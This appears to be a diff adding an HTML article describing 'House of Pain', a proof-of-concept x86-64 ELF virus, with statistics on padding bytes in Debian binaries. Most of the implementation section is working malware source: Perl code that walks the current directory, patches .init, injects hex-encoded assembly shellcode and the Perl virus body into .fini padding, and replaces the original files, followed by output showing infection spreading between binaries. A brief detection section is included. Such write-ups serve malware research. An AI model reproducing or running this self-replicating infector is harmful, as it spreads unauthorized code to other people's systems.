@@ -1,0 +1,1122 @@
+<html>
+<head>
+<title>House of Pain - A practical approach for an x86-64 ELF virus</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+|=----------------------------------------------------------------------------=|
+|=----------------------------=[ House of Pain ]=-----------------------------=|
+|=------------=[ A practical approach for an x86-64 ELF virus ]=--------------=|
+|=----------------------------------------------------------------------------=|
+|=----------------------------------------------------------------------------=|
+|=-.----------------.--=[ isra - isra.cl - hckng.org  ]=----------------------=|
+|=----------------------------------------------------------------------------=|
+
+
+ 1. Introduction
+ 2. Preliminaries
+ 3. Patterns in ELF binaries
+    1. Number of ELFs
+    2. Executable sections
+    3. Section size
+    4. Padding bytes
+    5. Section code
+ 4. Infection
+    1. Goal
+    2. Algorithm
+ 5. Implementation
+    1. Helper subroutines and main loop
+    2. Virus content
+    3. Read ELF header
+    4. Check for infected binaries
+    5. Find .init and .fini sections
+    6. Find available padding bytes
+    7. Append first jmp in .init
+    8. Adjust and append Assembly payload
+    9. Append second jump and virus
+    10. Copy rest of binary and replace original file
+    11. Virus payload
+ 6. Detection
+ 7. Results and final words
+ 8. The code
+ 9. References
+
+
+--[ 1. Introduction
+
+This article describes a practical approach for a proof-of-concept x86-64 ELF
+virus "House of Pain" based on the classical Text Segment Padding Infection
+technique and common patterns found in regular x86-64 ELF binaries. The
+presented approach involves single-byte patching, jumps between padding areas,
+and a combined implementation of Assembly and Perl. In addition, this approach
+does not modify any header information or file size.
+
+IMPORTANT NOTE: The work presented in this article was made for educational
+purposes only, I'm not responsible for any misuse or damage caused by it. Use it
+at your own risk.
+
+--[ 2. Preliminaries
+
+The Text Segment Padding Infection technique was described almost 26 years ago
+by Silvio Cesare in the papers "UNIX ELF PARASITES AND VIRUS"[1] and "UNIX
+VIRUSES"[2]. Roughly speaking this infection method considers the fact that the
+text and data segments are stored flush against each other on disk and such
+segments need to be aligned based on the system's page size, which leaves an
+amount of padding bytes between the text and data segments that can be used to
+inject parasite code. Diagram 1 (extracted from [1]) illustrates such process:
+
+key:
+    [...]   A complete page
+    V       Parasite code
+    T       Text
+    D       Data
+    P       Padding
+
+
+------------- Diagram 1: Text Segment Padding Infection ------------------------
+
+Page Nr
+#1      [TTTTTTTTTTTTVVPP]    &lt;- Text segment
+#2      [PPPPDDDDDDDDPPPP]    &lt;- Data segment
+
+--------------------------------------------------------------------------------
+
+A simple yet elegant concept. For a more recent discussion on ELF infection
+techniques the reader is encouraged to read ElfMaster's "Modern ELF Infection
+Techniques of SCOP Binaries"[3] and ic3qu33n's "u used 2 call me on my
+polymorphic shell phone"[4].
+
+
+--[ 3. Patterns in ELF binaries
+
+As mentioned before, the Text Segment Padding Infection technique makes use of
+available padding bytes at the end of the text segment to inject parasite code.
+Basic tests show that these padding bytes are present by default on most text
+sections. The question is: how common is this behaviour on regular ELF binaries
+i.e. binaries installed on a common Linux distribution? do these binaries share
+a common structure that can be used in an infection scenario?
+
+To answer these questions several tests were performed to analyze properties of
+binaries located under /usr/bin and /usr/sbin on a Debian 12 distribution. The
+results of these tests will form the basis for "House of Pain".
+
+----[ 3.1 Number of ELFs
+
+First a simple check for ELF magic numbers is done to obtain the number of valid
+ELFs to be analyzed under /usr/bin and /usr/sbin.
+
+ $ readelf -h /usr/bin/* 2&gt;/dev/null | grep "7f 45 4c 46" | sort | uniq -c
+
+   1122   Magic:  7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
+     48   Magic:  7f 45 4c 46 02 01 01 03 00 00 00 00 00 00 00 00
+
+ $ readelf -h /usr/sbin/* 2&gt;/dev/null | grep "7f 45 4c 46" | sort | uniq -c
+
+   340   Magic:  7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
+     2   Magic:  7f 45 4c 46 02 01 01 03 00 00 00 00 00 00 00 00
+
+Results show 1170 valid ELF binaries under /usr/bin and 342 under /usr/sbin,
+with a total of 1512 files.
+
+----[ 3.2 Executable sections
+
+Executable sections can be directly identified by looking for entries with
+SHF_ALLOC|SHF_EXECINSTR flags (AX in readelf utility). The first tests are then
+aimed to check for common executable sections present in regular binaries and
+the order in which they may appear (section index). This is done as follows:
+
+ $ readelf -W -S /usr/bin/* 2&gt;/dev/null | grep "AX" | \
+   awk '{print $1" "$2" "$11}' | sort | uniq -c | sort -r
+
+   1040 [13] .plt 16
+   1040 [12] .init 4
+   1026 [16] .fini 4
+   1025 [14] .plt.got 8
+   1020 [15] .text 16
+     90 [15] .fini 4
+     90 [14] .text 16
+     76 [12] .plt 16
+     76 [11] .init 4
+     75 [13] .plt.got 8
+     40 [17] .fini 4
+     40 [14] .plt 16
+     40 [13] .init 4
+     39 [16] .text 16
+     39 [15] .plt.got 8
+     10 [18] .fini 4
+     10 [17] .text 16
+     10 [16] .plt.got 8
+     10 [15] .plt 16
+     10 [14] .init 4
+      5 [15] .text 64
+      2 [15] .text 32
+      1 [18] .plt 16
+      1 [16] .init 4
+      1 [14] .fini 4
+      1 [13] .text 256
+      1 [12] .text 32
+      1 [11] .plt 16
+
+
+ $ readelf -W -S /usr/sbin/* 2&gt;/dev/null | grep "AX" | \
+   awk '{print $1" "$2" "$11}' | sort | uniq -c | sort -r
+
+    321 [16] .fini 4
+    319 [15] .text 16
+    319 [14] .plt.got 8
+    319 [13] .plt 16
+    319 [12] .init 4
+     13 [13] .plt.got 8
+     13 [12] .plt 16
+     13 [11] .init 4
+     12 [15] .fini 4
+     12 [14] .text 16
+      8 [14] .plt 16
+      8 [13] .init 4
+      7 [17] .fini 4
+      7 [16] .text 16
+      7 [15] .plt.got 8
+      2 [18] .fini 4
+      2 [17] .text 16
+      2 [16] .plt.got 8
+      2 [15] .plt 16
+      2 [14] .init 4
+      1 [15] .text 32
+      1 [14] .text 64
+
+
+The output above displays the number of occurrences, section index, section
+name and address alignment. Results show that most binaries have executable
+sections at the following indexes:
+
+            _________________________________________________
+           |  section  |  index  |  range  |  addr alignment |
+            -------------------------------------------------
+           | .init     |   12    | [11-16] |           4     |
+           | .plt      |   13    | [11-18] |          16     |
+           | .plt.got  |   14    | [13-16] |           8     |
+           | .text     |   15    | [13-17] |      16-256     |
+           | .fini     |   16    | [15-18] |           4     |
+            -------------------------------------------------
+                      Table 1: Executable sections
+
+The reader may also notice that most executable sections have a fixed address
+alignment, which will be used later on.
+
+
+----[ 3.3 Section size
+
+The next step is to check the size of executable sections, as follows:
+
+ $ readelf -W -S /usr/bin/* 2&gt;/dev/null | grep "AX" | awk '{print $2" "$6}' | \
+   sort | uniq -c | sort -r
+
+   1165 .fini 000009
+   1163 .init 000017
+    867 .plt.got 000008
+    114 .plt.got 000010
+     85 .plt.got 000018
+     31 .plt 000310
+     27 .plt.got 000020
+     26 .plt 000160
+     19 .plt.got 000030
+     19 .plt 000390
+     18 .plt 000330
+     17 .plt.got 000028
+     17 .plt 000880
+     16 .plt 000290
+     16 .plt 000200
+     15 .plt 000670
+     [...]
+     3 .text 01509e
+     3 .text 00c8e2
+     3 .text 00b38e
+     3 .text 009dfe
+     3 .text 00992e
+     3 .text 003425
+     3 .text 0030d1
+     3 .text 002bae
+     3 .text 001ac2
+     3 .text 001401
+     [...]
+     1 .plt 0004e0
+     1 .plt 000060
+     1 .plt 000050
+     1 .init 000024
+     1 .init 000021
+     1 .init 00001b
+     1 .init 00001a
+     1 .fini 00000e
+     1 .fini 00000d
+
+ $ readelf -W -S /usr/sbin/* 2&gt;/dev/null | grep "AX" | awk '{print $2" "$6}' | \
+   sort | uniq -c | sort -r
+
+    342 .init 000017
+    342 .fini 000009
+    306 .plt.got 000008
+     44 .text 1d12ad
+     44 .plt 000ee0
+     32 .plt 001050
+     31 .text 01e763
+     17 .plt.got 000010
+      9 .plt.got 000028
+      7 .text 00ad97
+      7 .plt 000880
+      7 .plt 0003d0
+      6 .text 0d9c3c
+      6 .text 01978c
+      6 .plt 001560
+      6 .plt 000850
+      [...]
+      1 .text 000ce6
+      1 .text 000ca7
+      1 .text 000c5d
+      1 .text 000ace
+      1 .text 000aae
+      1 .text 000a66
+      1 .text 000a17
+      [...]
+      1 .plt 0001a0
+      1 .plt 000190
+      1 .plt 000140
+      1 .plt 000110
+      1 .plt 0000c0
+      1 .plt 000090
+      1 .plt 000080
+      1 .plt 000060
+
+The output above displays the number of occurrences, section name and section
+size. Results show that most .init and .fini sections have the same size across
+different binaries (17 and 9), many .plt.got sections have size 8, and the .plt
+and .text sections have variable sizes.
+
+
+----[ 3.4 Padding bytes
+
+A custom script [5] was used to analyze available padding bytes on executable
+sections using the formula:
+
+ padding bytes = next section offset - (section offset + section size)
+
+The results are as follows:
+
+ $ perl padding-bytes.pl
+
+
+ [+] Padding bytes analyzer
+ [*]
+ [+] Analyzing /usr/bin
+ [+] Analyzing /usr/sbin
+ [*]
+ [+] Total files analyzed: 1512
+ [+] Total files with .init section: 1509
+ [+] Total files with .plt section: 1511
+ [+] Total files with .plt.got section: 1490
+ [+] Total files with .text section: 1512
+ [+] Total files with .fini section: 1509
+ [*]
+ [+] Average padding size for .init: 8.98011928429423
+ [+] Average padding size for .plt: 2.75314361350099
+ [+] Average padding size for .plt.got: 7.13020134228188
+ [+] Average padding size for .text: 3.73148148148148
+ [+] Average padding size for .fini: 2086.91981444665
+ [*]
+ [+] Padding bytes sizes per section
+ [+] Section .init:
+     Padding size 5: 1 file(s)
+     Padding size 1: 4 file(s)
+     Padding size 15: 1 file(s)
+     Padding size 14: 1 file(s)
+     Padding size 4: 1 file(s)
+     Padding size 9: 1501 file(s)
+ [+] Section .plt:
+     Padding size 16: 3 file(s)
+     Padding size 3952: 1 file(s)
+     Padding size 0: 1506 file(s)
+     Padding size 160: 1 file(s)
+ [+] Section .plt.got:
+     Padding size 0: 186 file(s)
+     Padding size 56: 1 file(s)
+     Padding size 8: 1298 file(s)
+     Padding size 40: 4 file(s)
+     Padding size 24: 1 file(s)
+ [+] Section .text:
+     Padding size 3: 426 file(s)
+     Padding size 2243: 1 file(s)
+     Padding size 687: 1 file(s)
+     Padding size 0: 229 file(s)
+     Padding size 1: 296 file(s)
+     Padding size 2: 558 file(s)
+     Padding size 22: 1 file(s)
+ [+] Section .fini:
+     Padding size 1167: 2 file(s)
+     Padding size 1611: 1 file(s)
+     Padding size 3815: 2 file(s)
+     Padding size 1223: 1 file(s)
+     Padding size 51: 2 file(s)
+     Padding size 1779: 1 file(s)
+     Padding size 1211: 1 file(s)
+     Padding size 1495: 3 file(s)
+     Padding size 3731: 2 file(s)
+     Padding size 523: 3 file(s)
+     Padding size 2619: 1 file(s)
+     Padding size 1303: 1 file(s)
+     Padding size 835: 2 file(s)
+     Padding size 563: 3 file(s)
+     [...]
+     Padding size 647: 1 file(s)
+     Padding size 3699: 15 file(s)
+     Padding size 3863: 6 file(s)
+     Padding size 1043: 5 file(s)
+     Padding size 1943: 1 file(s)
+     Padding size 3335: 1 file(s)
+     Padding size 259: 6 file(s)
+     Padding size 787: 2 file(s)
+     Padding size 3843: 3 file(s)
+
+The output above displays the total number of binaries containing each
+executable section, average padding bytes per section and the number of binaries
+with a given padding size per section. Results show that most binaries have
+executable sections with a fixed size of padding bytes, with the exception of
+.fini section which in addition presents the greater size of padding bytes on
+average:
+
+            ____________________________________________
+           |  section  |  frequent padding  |  average  |
+            --------------------------------------------
+           | .init     |         9          |    8.5    |
+           | .plt      |         0          |    0.8    |
+           | .plt.got  |         8          |     7     |
+           | .text     |         3          |     5     |
+           | .fini     |         -          |   1845    |
+            --------------------------------------------
+                       Table 2: Padding bytes
+
+These results also show that padding bytes are present in most executable
+sections.
+
+
+----[ 3.5 Section code
+
+Finally, the content of executable sections with roughly the same size across
+binaries was analyzed to check for patterns. As expected, the disassembly of
+.init and .fini sections in common binaries show that the executable code used
+in .init sections is similar, and the executable code used in .fini sections is
+exactly the same:
+
+ $ objdump -d -j .init -j .fini /usr/bin/perl
+ [...]
+ 0000000000047000 &lt;.init&gt;:
+   47000:       48 83 ec 08             sub    $0x8,%rsp
+   47004:       48 8b 05 d5 9f 33 00    mov    0x339fd5(%rip),%rax
+   4700b:       48 85 c0                test   %rax,%rax
+   4700e:       74 02                   je     47012 &lt;endgrent@plt-0x1e&gt;
+   47010:       ff d0                   callq  *%rax
+   47012:       48 83 c4 08             add    $0x8,%rsp
+   47016:       c3                      retq
+ [...]
+ 00000000001cb05c &lt;.fini&gt;:
+  1cb05c:       48 83 ec 08             sub    $0x8,%rsp
+  1cb060:       48 83 c4 08             add    $0x8,%rsp
+  1cb064:       c3                      retq
+
+
+ $ objdump -d /usr/bin/sudo
+ [...]
+ 0000000000005000 &lt;.init&gt;:
+    5000:       48 83 ec 08             sub    $0x8,%rsp
+    5004:       48 8b 05 dd 6f 02 00    mov    0x26fdd(%rip),%rax
+    500b:       48 85 c0                test   %rax,%rax
+    500e:       74 02                   je     5012 &lt;mkstemps@plt-0x1e&gt;
+    5010:       ff d0                   callq  *%rax
+    5012:       48 83 c4 08             add    $0x8,%rsp
+    5016:       c3                      retq
+ [...]
+ 0000000000021a24 &lt;.fini&gt;:
+   21a24:       48 83 ec 08             sub    $0x8,%rsp
+   21a28:       48 83 c4 08             add    $0x8,%rsp
+   21a2c:       c3                      retq
+
+
+ $ objdump -d /usr/sbin/reboot
+ [...]
+ 0000000000011000 &lt;.init&gt;:
+   11000:       48 83 ec 08             sub    $0x8,%rsp
+   11004:       48 8b 05 95 2f 0f 00    mov    0xf2f95(%rip),%rax
+   1100b:       48 85 c0                test   %rax,%rax
+   1100e:       74 02                   je     11012 &lt;chmod@plt-0x1e&gt;
+   11010:       ff d0                   callq  *%rax
+   11012:       48 83 c4 08             add    $0x8,%rsp
+   11016:       c3                      retq
+ [...]
+ 00000000000bf8cc &lt;.fini&gt;:
+   bf8cc:       48 83 ec 08             sub    $0x8,%rsp
+   bf8d0:       48 83 c4 08             add    $0x8,%rsp
+   bf8d4:       c3                      retq
+
+
+--[ 4. Infection
+
+----[ 4.1 Goal
+
+The main goal for "House of Pain" is to perform infection with the minimum
+modification of the original binary as possible. This is achieved by considering
+the following (based mostly on the results from the Section 3):
+
+  * Most binaries have the executable sections .init and .fini
+  * Most .init and .fini entries can be found within a bounded range in the
+    section headers table.
+  * Padding bytes are present in most x86-64 ELF binaries.
+  * Most .init sections have a fixed amount of padding bytes.
+  * Most .fini sections have a large amount of padding bytes on average.
+  * Most .init sections share similar executable code ending in 0xc3.
+  * The .init section code is executed before the binary's main program.
+
+
+----[ 4.2 Algorithm
+
+The infection algorithm is a combination/variation of "Text Segment Padding
+Infection"[2][3] and "Linux.Linkin.pl: Another Perl x64 ELF virus"[6]. The idea
+is simple:
+
+ * Patch the last byte of the .init section code (0xc3 return instruction) with
+   a NOP instruction to extend the execution flow.
+
+ * Inject an auxiliary parasite code (5-byte JMP + 1-byte 0xc3) in the available
+   padding bytes after the .init section to redirect the execution flow to the
+   available padding bytes after the .fini section .
+
+ * Inject the main parasite code in the available padding bytes after the .fini
+   section, with a final 5-byte JMP to return to the 0xc3 instruction of the
+   extended .init section, which then returns the execution flow to the binary's
+   main program.
+
+Since the .init section is executed before the binary's main program and most
+binaries have padding bytes available, the algorithm described does not require
+the modification of the binary's entry point or headers information.
+
+Diagrams 2 and 3 illustrate scenarios of non-infected and infected binaries:
+
+  I    init content
+  C    return instruction c3
+  P    padding bytes
+  F    fini content
+  D    rodata content
+  N    NOP instruction
+  J    JMP instruction
+  V    parasite code
+  +    sections between .init and .fini
+
+-------------------- Diagram 2: non-infected -----------------------------------
+
+  [ IIIIIIIIII ] &lt;- .init section (17 bytes)
+  [ IIIIIICPPP ] &lt;- return instruction + start of padding (9 bytes)
+  [ PPPPPP++++ ] &lt;- start of next sections
+  [ ++++++++++ ]
+  [ ++++++++++ ]
+  [ FFFFFFFFFP ] &lt;- .fini section (9 bytes) + start of padding
+  [ PPPPPPPPPP ]
+  [ .......... ]
+  [ PPPPPPPPPP ]
+  [ DDDDDDDDDD ] &lt;- .rodata section
+
+
+---------------------- Diagram 3: infected -------------------------------------
+
+  [ IIIIIIIIII ] &lt;- .init section (17 bytes)
+  [ IIIIIINJJJ ] &lt;- NOP instruction + jump to parasite code (5 bytes)
+  [ JJCPPP++++ ] &lt;- start of next sections
+  [ ++++++++++ ]
+  [ ++++++++++ ]
+  [ FFFFFFFFFV ] &lt;- .fini section (9 bytes) + start of parasite code
+  [ VVVVVVVVVV ]
+  [ .......... ]
+  [ VJJJJJPPPP ] &lt;- jump to .init extended return instruction (5 bytes)
+  [ DDDDDDDDDD ] &lt;- .rodata section
+
+
+--[ 5. Implementation
+
+The main part of "House of Pain" is implemented as Perl code [6][7] that gets
+embedded in the available padding bytes after the .fini section and then when
+the infected binary is executed a crafted Assembly payload is used to run the
+infected binary as a Perl script. The script loops through its current directory
+infecting other suitable binaries and then prints an extract from the song "Jump
+around" from "House of Pain". Relevant parts of the implementation will be
+discussed in the next subsections.
+
+NOTE: The described Perl implementation has been minimized to reduce its size
+and therefore it may not be easy to read at first.
+
+
+----[ 5.1 Helper subroutines and main loop
+
+First, three helper subroutines are used for reading and writing content in a
+succinct way:
+
+--------------------------------------------------------------------------------
+ sub rd { read $_[0], my $x, $_[1];$x }
+ sub sk { seek $_[0], $_[1], 0 }
+ sub wr { syswrite $_[0], $_[1] }
+--------------------------------------------------------------------------------
+
+Then, the main loop iterates through the current directory checking for valid
+files and skipping the current script/infected binary:
+
+--------------------------------------------------------------------------------
+ foreach my $f(glob qq{"./*"}){
+     next if(!-f $f);
+     # skip self
+     next if($f eq $0);
+     [...]
+     [...]
+ }
+--------------------------------------------------------------------------------
+
+
+----[ 5.2 Virus content
+
+The next step is to obtain the virus content by using the predefined variable
+$0. Note that if "House of Pain" is executed from an infected binary then a
+search for the strings "#!/usr/bin/perl" and "__END__" must be performed to
+ensure that only the source code of the virus is copied and not the content of
+the binary. Also note that the virus content must start with a newline character
+to avoid concatenation of unwanted prefixes in the string "#!/usr/bin/perl".
+
+--------------------------------------------------------------------------------
+ my $vx = "\n";
+ my $vx_end = "__"."END__";
+
+ # get vx content
+ my $vx_start = 0;
+ open my $vh, '&lt;', $0;
+ while(&lt;$vh&gt;) {
+     $vx_start++ if($_ =~ "#!/usr/bin/perl");
+     $vx .= $_ if($vx_start);
+     last if($_ =~ /$vx_end/);
+ }
+ my $vx_sz = length($vx);
+--------------------------------------------------------------------------------
+
+
+----[ 5.3 Read ELF header
+
+The target binary is opened with the ':raw' pseudo-layer for passing binary
+data and its ELF header is read using the unpack function (see [7] for a more
+detailed explanation). Then a simple check for the magic numbers is made to skip
+non-ELFs.
+
+--------------------------------------------------------------------------------
+ # read elf header
+ open my $fh, '&lt;:raw', $f;
+ my @e = unpack("C a a a C12 S2 I q3 I S6", rd($fh, 64));
+ # skip non-elfs
+ next if($e[0] != 127 && $e[1] !~ 'E' && $e[2] !~ "L" && $e[3] !~ "F");
+--------------------------------------------------------------------------------
+
+
+----[ 5.4 Check for infected binaries
+
+To skip infected files a simple check is done by looking for the string
+"#!/usr/bin/perl" embedded in the binary. This is far from ideal and it should
+be enhanced in future versions or variations.
+
+--------------------------------------------------------------------------------
+# lazy check for infected files
+ my $infect = 0;
+ open my $fh2, '&lt;:raw', $f;
+ while(&lt;$fh2&gt;) {
+     if($_ =~ "#!/usr/bin/perl") {
+         $infect++;
+         last;
+     }
+ }
+ next if($infect);
+--------------------------------------------------------------------------------
+
+
+----[ 5.5 Find .init and .fini sections
+
+The .init and .fini sections are found based on the patterns discussed in
+subsection 3.2. First a SEEK operation is performed to the start of the section
+headers table using the value $e[21] = e_shoff. Then the first 18 entries (of
+size $e[26] = e_shentsize) in the section header table are read and unpacked.
+The .init section is found by looking for the first section with $u[2] =
+sh_flags = 6 (AX) and the .fini section is found by looking for the next section
+after .init with $u[2] = sh_flags = 6 (AX) and $u[8] = sh_addralign = 4.
+
+--------------------------------------------------------------------------------
+ sk($fh, $e[21]);
+ my ($y1, $z1, $y2, $z2);
+ for(my $i = 0; $i &lt; 18; $i++) {
+     my @u = unpack("I2 q4 I2 q2", rd($fh, $e[26]));
+     # first section with sh_flags =6 (AX) should be .init
+     if($u[2] == 6) {
+         ($y1, $z1) = ($u[4], $u[5]) if(!$y1);
+         ($y2, $z2) = ($u[4], $u[5]) if(!$y2 && $i&gt;12 && $u[8] == 4);
+     }
+     last if($y2);
+ }
+ next if(!$y1 or !$y2); # .init or .fini not found, skip
+--------------------------------------------------------------------------------
+
+After this, the variables $y1, $z1 contain the values sh_offset and sh_size of
+the .init section and $y2, $z2 contain the values sh_offset and sh_size of the
+.fini section. If these values are not defined then the sections were not found
+and the binary is skipped.
+
+
+----[ 5.6 Check for available padding bytes
+
+After finding .fini the next section is read and unpacked to check for available
+padding bytes. For this the condition "$u[4] - ($y2 + $z2) &lt; $p_sz + $vx_sz" is
+checked, where:
+
+ $u[4]     = next section (usually .rodata) sh_offset
+ $y2 + $z2 = .fini sh_offset + .fini sh_size
+ $p_sz     = size of the Assembly payload
+ $vx_sz    = size of "House of Pain" (from subsection 5.1)
+
+--------------------------------------------------------------------------------
+ # read next section header entry (.rodata)
+ my @u = unpack("I2 q4 I2 q2", rd($fh, $e[26]));
+
+ # check if vx size + payload fits between .rodata and .fini
+ # free space: .rodata sh_offset - (.fini sh_offset + .fini sh_size)
+ next if($u[4] - ($y2 + $z2) &lt; $p_sz + $vx_sz);
+--------------------------------------------------------------------------------
+
+If the amount of available padding bytes is not enough the binary is skipped.
+
+
+----[ 5.7 Append first jmp in .init
+
+The next step is to append the first jmp in the available padding bytes after
+.init (assuming that there will be enough space for it - See subsection 3.3). A
+temporary copy of the binary is created and the binary's content is copied until
+the last byte of the .init section - 1, which is:
+
+ $y1 + $z1 -1 = .init sh_offset + .init sh_size - 1.
+
+Then the distance to the available bytes after the .fini section is calculated
+with $dist = $y2 + $z2 - $y1 -$z1 - 7, where:
+
+ $y2 = .fini sh_offset
+ $z2 = .fini sh_size
+ $y1 = .init sh_offset
+ $z2 = .init sh_size
+ 7   = 1-byte NOP + 5-byte JMP instruction + 1-byte return instruction (0xc3)
+
+The jump payload is then built starting with the 0x90 NOP instruction, then the
+0xe9 instruction to the calculated distance (packed as 32-bit little-endian
+value) and finally a 0xc3 return instruction.
+
+After that the rest of the binary is copied until the start of the available
+padding bytes after .fini ($dist + 1).
+
+--------------------------------------------------------------------------------
+ # tmp copy for patched elf
+ open my $tmp_fh, '&gt;:raw' , "$f.t";
+
+ # read everything until the end of .init code except for the last byte
+ # which should contain the return instruction 0xc3
+ sk($fh,0);
+ wr($tmp_fh, rd($fh, $y1 + $z1 - 1));
+
+ # write jmp to padding bytes after .fini
+ my $dist = $y2 + $z2 - $y1 -$z1 - 7;
+ my $jmp1 = "\x90\xe9".pack("V",$dist)."\xc3";
+ rd($fh,7);
+ wr($tmp_fh, $jmp1);
+
+ # read and copy rest of binary until padding bytes after .fini
+ wr($tmp_fh, rd($fh, $dist + 1));
+--------------------------------------------------------------------------------
+
+
+----[ 5.8 Adjust and append Assembly payload
+
+As mentioned before, "House of Pain" performs most of its main logic by running
+the infected binary as a Perl script. This is done by using a crafted Assembly
+payload to execute "/usr/bin/perl -x infected binary" (described in detail in
+[7]). However, the "infected_binary" (filename) argument must be adjusted on
+each infection according to the binary's filename. To achieve this an initial
+Assembly code is compiled using a fixed string of length 50 as the filename
+argument (this string will be replaced later on), as follows:
+
+--------------------------------------------------------------------------------
+BITS 64
+global main
+section .text
+ main:
+    call run
+    db "/usr/bin/perl", 0x0
+    db "-x", 0x0
+    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", 0x0
+
+ run:
+    ;;;;;;;;
+    ; fork
+    ;;;;;;;;
+    pop rsi
+    xor rax, rax
+    mov rax, 57
+    syscall
+    test eax, eax
+    jne parent
+
+    ;;;;;;;;;;;;;;;;;;;;;;;;;
+    ; call perl interpreter
+    ;;;;;;;;;;;;;;;;;;;;;;;;;
+
+    ; filename "/usr/bin/perl"
+    lea rdi, [rsi]
+
+    ; argv
+    ; ["/usr/bin/perl", "-x", "xxxxx..."] (on reverse)
+    xor rdx, rdx
+    push rdx
+    lea rbx, [rsi+17] ; "xxx..."
+    push rbx
+    lea rbx, [rsi+14] ; "-x"
+    push rbx
+    push rdi          ; "/usr/bin/perl"
+    mov rsi, rsp
+
+    ; execve & exit
+    xor rax, rax
+    mov rax, 59
+    mov rdx, 0
+    syscall
+    xor rdx, rdx
+    mov rax, 60
+    syscall
+
+ parent:
+    ; cleanup
+    xor rax, rax
+    xor rdx, rdx
+--------------------------------------------------------------------------------
+
+ $ nasm -f elf64 -o hop.o hop.s
+ $ objdump -d hop.o
+
+After this, the hardcoded payload is generated by removing the hexadecimal
+representation of the fixed string (\x78 * 50) and then splitting the remaining
+shellcode in two: before ($p1) and after ($p2) the fixed string.
+
+--------------------------------------------------------------------------------
+ my ($p1, $p2);
+ $p1 .= "\xe8\x44\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72";
+ $p1 .= "\x6c\x00\x2d\x78\x00";
+
+ $p2 .= "\x00\x5e\x48\x31\xc0\xb8\x39\x00\x00\x00\x0f\x05\x85\xc0\x75\x2e\x48";
+ $p2 .= "\x8d\x3e\x48\x31\xd2\x52\x48\x8d\x5e\x11\x53\x48\x8d\x5e\x0e\x53\x57";
+ $p2 .= "\x48\x89\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f";
+ $p2 .= "\x05\x48\x21\xd2\xb8\x3c\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x31\xd2";
+--------------------------------------------------------------------------------
+
+The payload is adjusted on each infection by inserting the hexadecimal
+representation of the infected binary's filename plus N null bytes, where:
+
+ N = 50 - length(infected binary's filename)
+
+Filling with N null bytes after the infected binary's filename ensures that the
+payload will not crash on runtime, since adding or removing bytes will break the
+shellcode. In addition, the first null byte located after the infected binary's
+filename will be interpreted by the machine as the end of the string and the
+remaining null values will be ignored. This leads to the following code:
+
+--------------------------------------------------------------------------------
+ # write 1st payload
+ rd($fh, $p_sz);
+ wr($tmp_fh, $p1);
+
+ # adjust payload on-the-fly to include the infected elf filename
+ # filename . (50-filename) null bytes
+ my @chars = split//, $f;
+ for(my $i = 2; $i &lt; length($f); $i++){
+     wr($tmp_fh, pack("C",(hex unpack("H2", $chars[$i]))));
+ }
+ for(my $i = length($f) - 2; $i &lt; 50; $i++){
+     wr( $tmp_fh, pack("C",0x0));
+ }
+
+ # write remaining payload
+ wr($tmp_fh, $p2);
+--------------------------------------------------------------------------------
+
+
+----[ 5.9 Append second jump and virus
+
+The second jump is built in the same way as the first one: 0xe9 instruction with
+the distance to the last byte (0xc3) of the first jump, where:
+
+ $dist = distance between available bytes of .init and .fini
+ $p_sz = size of the assembly payload
+
+After that the virus content $vx of size $vx_sz is copied into the rest of the
+available padding bytes.
+
+--------------------------------------------------------------------------------
+ my $jmp2 = "\xe9".pack("V",-$dist - $p_sz - 7);
+ wr($tmp_fh, $jmp2);
+ rd($h,5);
+ wr($tmp_fh, $vx);
+ rd($fh, $vx_sz);
+--------------------------------------------------------------------------------
+
+
+----[ 5.10 Copy rest of binary and replace original file
+
+Once the parasite code has been embedded into the infected binary the rest of
+the original binary is copied until the end of file, where:
+
+ $f_sz  = size of the original binary
+ $y2    = .fini sh_offset
+ $z2    = .fini sh_size
+ $p_sz  = size of the assembly payload
+ $vx_sz = size of the "House of Pain"
+ 5      = size of JMP instruction
+
+Then the original binary is deleted, the temporary copy is renamed to the
+binary's original filename and the copy is deleted.
+
+--------------------------------------------------------------------------------
+ wr($tmp_fh, rd($fh, $f_sz - ($y2 + $z2 + $p_sz + $vx_sz + 5)));
+
+ # delete original binary and replace it with modified copy
+ unlink $f;
+ copy("$f.t", $f);
+ unlink "$f.t";
+ chmod 0755, $f;
+--------------------------------------------------------------------------------
+
+
+----[ 5.11 Virus payload
+
+The last part after the main loop contains the virus payload, which in this case
+prints an extract from the song "Jump around" from "House of Pain". Of course,
+this could be replaced with a more elaborated payload in the future:
+
+--------------------------------------------------------------------------------
+ print "jump! " x 4;
+--------------------------------------------------------------------------------
+
+
+--[ 6. Detection
+
+Detection for "House of Pain" is trivial. A first approach would be to check
+if the last byte of the .init section has been modified (with value other than
+0xc3). Another approach would be to check if the available padding bytes after
+the .init and .fini sections are not null, which would indicate the presence of
+parasite code.
+
+
+--[ 7. Results and final words
+
+The code discussed in Section 5 was minimized to reduce the size of the virus
+(see Section 8) obtaining a final size of 1855 bytes. A simple modification was
+made to the script padding-bytes.pl[5] to check for the number of binaries with
+enough padding bytes for this minimized version, indicating that 859 out of 1512
+files (56%) could be infected. Note that "House of Pain" uses a simple 20-byte
+virus payload (See section 5.11). If, for example, a 100-byte payload is to be
+used then the number of binaries that could be infected is reduced to 835 files
+(55%).
+
+Some infection examples of common binaries are shown below. In these cases the
+virus payload gets printed after the output of the infected binaries due likely
+to the use of fork in the Assembly payload.
+
+ (first infection with Perl script)
+ $ cp /usr/bin/perl .
+ $ perl hop.pl
+ jump!  jump!  jump!  jump!  $
+
+ (execution of infected binary)
+ $ ./perl -v
+
+ This is perl 5, version 32, subversion 1 (v5.32.1) built for
+ x86_64-linux-gnu-thread-multi (with 48 registered patches, see perl -V for more
+ detail)
+ [...]
+ Complete documentation for Perl, including FAQ lists, should be found on
+ this system using "man perl" or "perldoc perl".  If you have access to the
+ Internet, point your browser at http://www.perl.org/, the Perl Home Page.
+
+ $ jump!  jump!  jump!  jump!
+
+ (second infection from infected binary)
+ $ cp /usr/bin/ls .
+ $ ./ls
+ hop.pl ls  perl
+ $ ./perl -v
+ [...]
